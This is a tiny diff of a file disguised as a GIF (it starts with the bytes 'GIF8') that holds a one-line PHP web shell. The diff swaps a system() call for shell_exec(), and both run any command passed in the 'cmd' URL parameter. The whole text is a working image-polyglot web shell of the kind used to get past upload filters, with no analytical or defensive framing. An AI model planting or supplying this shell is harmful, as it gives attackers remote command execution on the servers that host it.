@@ -1,2 +1,2 @@
 GIF8
-<?php system($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']);  ?>
